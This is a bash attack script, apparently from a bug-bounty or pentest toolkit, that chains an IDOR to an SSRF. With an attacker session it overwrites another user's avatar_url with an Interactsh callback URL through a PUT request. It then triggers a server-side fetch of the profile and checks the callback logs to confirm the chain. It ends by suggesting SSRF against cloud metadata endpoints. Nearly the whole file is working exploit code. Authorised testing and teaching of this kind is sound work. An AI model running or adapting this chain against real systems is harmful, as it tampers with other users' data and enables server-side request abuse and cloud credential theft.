#!/usr/bin/env bash
# chain/idor-ssrf.sh
#
# Premise: an IDOR that returns a URL we can edit + a server-side fetch
# of that URL = SSRF as the victim. Common pattern in webhook configs,
# image proxies, and avatar URLs.
#
# Chain:
#   1. Use IDOR primitive to write a victim's resource URL (e.g. avatar)
#   2. Point that URL at our Interactsh listener
#   3. Wait for the victim's server to fetch it on render
#   4. Confirm via callback

PHASE="chain-idor-ssrf"
. "$(dirname "$0")/../vuln/_lib.sh"
require_target
ensure_scope
OUTDIR=$(out_dir "$PHASE")

IDOR_WRITE_URL="${IDOR_WRITE_URL:-}"
IDOR_FIELD="${IDOR_FIELD:-avatar_url}"
VICTIM_OBJECT_ID="${VICTIM_OBJECT_ID:-}"
AUTH_A="${AUTH_A:-}"  # attacker
INTERACTSH_URL="${INTERACTSH_URL:-}"

[ -z "$IDOR_WRITE_URL" ] && { log ERR "IDOR_WRITE_URL required (e.g. https://target/api/users/$VICTIM_OBJECT_ID)"; exit 2; }
[ -z "$VICTIM_OBJECT_ID" ] && { log ERR "VICTIM_OBJECT_ID required (the OTHER user's ID — confirms IDOR)"; exit 2; }
[ -z "$AUTH_A" ] && { log ERR "AUTH_A required (attacker session)"; exit 2; }
[ -z "$INTERACTSH_URL" ] && {
    sess="$RECONFORGE_OUTPUT_DIR/$TARGET/$DATESTAMP/13-oob-callback/session-url.txt"
    [ -s "$sess" ] && INTERACTSH_URL=$(cat "$sess")
}
[ -z "$INTERACTSH_URL" ] && { log ERR "INTERACTSH_URL required"; exit 2; }

OOB_TOKEN="chain-$(date +%s)"
PAYLOAD_URL="http://${OOB_TOKEN}.${INTERACTSH_URL}/avatar.png"

# Step 1: write the OOB URL into the victim's record (IDOR)
log INFO "step 1: writing OOB URL into VICTIM record via IDOR"
write_resp=$(curl -sS --max-time 10 -X PUT "$IDOR_WRITE_URL" \
    -H "$AUTH_A" \
    -H 'Content-Type: application/json' \
    -d "{\"$IDOR_FIELD\": \"$PAYLOAD_URL\"}" \
    -w 'HTTP_STATUS:%{http_code}' 2>/dev/null)
echo "$write_resp" > "$OUTDIR/step1-write.txt"
if ! echo "$write_resp" | grep -qE 'HTTP_STATUS:20[0-4]'; then
    log WARN "write didn't return 2xx — IDOR may not have succeeded"
    cat "$OUTDIR/step1-write.txt"
    exit 0
fi
log INFO "  ✓ write accepted"

# Step 2: trigger the server-side fetch (read the victim's profile, which
# typically renders the avatar URL server-side for thumbnails)
TRIGGER_URL="${TRIGGER_URL:-${IDOR_WRITE_URL%/*}/$VICTIM_OBJECT_ID}"
log INFO "step 2: triggering server-side fetch via $TRIGGER_URL"
curl -sS --max-time 10 -H "$AUTH_A" "$TRIGGER_URL" > "$OUTDIR/step2-trigger.txt" 2>&1 || true

# Step 3: wait briefly for the callback to land
log INFO "step 3: waiting 10s for OOB callback (token: $OOB_TOKEN)"
sleep 10

CB_FILE="$RECONFORGE_OUTPUT_DIR/$TARGET/$DATESTAMP/13-oob-callback/callbacks.txt"
if grep -q "$OOB_TOKEN" "$CB_FILE" 2>/dev/null; then
    log INFO "  ✓ CHAIN CONFIRMED — server fetched our URL"
    grep "$OOB_TOKEN" "$CB_FILE" > "$OUTDIR/step3-confirmed.txt"
else
    log WARN "  no callback yet — server may render lazily; check $CB_FILE in 5 minutes"
fi

log INFO "chain done — report-writing checklist:"
log INFO "  1. Title: 'IDOR → SSRF chain via $IDOR_FIELD'"
log INFO "  2. CVSS: depends on what the SSRF reaches (cloud metadata = critical)"
log INFO "  3. Next: try SSRF to 169.254.169.254 / metadata.google.internal"
